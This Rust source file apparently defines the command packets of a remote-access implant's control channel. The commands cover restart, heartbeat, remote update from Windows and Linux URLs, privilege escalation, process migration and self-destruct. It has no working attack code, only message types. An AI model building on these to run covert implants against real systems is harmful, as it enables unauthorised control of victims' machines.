use crate::network::crypt;
use crate::network::packet::AnyPacket;
use serde::{Deserialize, Serialize};
use uuid::Uuid;
use crate::network::packet::types::ProcessIdentifier;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct UpdateUrls{
    windows: String,
    linux: String,
}
impl UpdateUrls {
    pub fn new(windows: String, linux: String) -> Self {
        Self { windows, linux }
    }
    pub fn windows(&self) -> &str {
        &self.windows
    }
    pub fn linux(&self) -> &str {
        &self.linux
    }
}
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum CotorPacket {
    Restart,
    Update(UpdateUrls),
    Heartbeat,
    Debug(String),
    Escalate(Uuid),
    EscalateResponse((Uuid,Result<(), String>)),
    Migrate(ProcessIdentifier),
    SelfDestruct,
}

#[typetag::serde]
impl AnyPacket for CotorPacket {
    fn as_any(&self) -> &dyn std::any::Any {
        self
    }
    fn as_any_box(self: Box<Self>) -> Box<dyn std::any::Any + Send + Sync> {
        self
    }
}
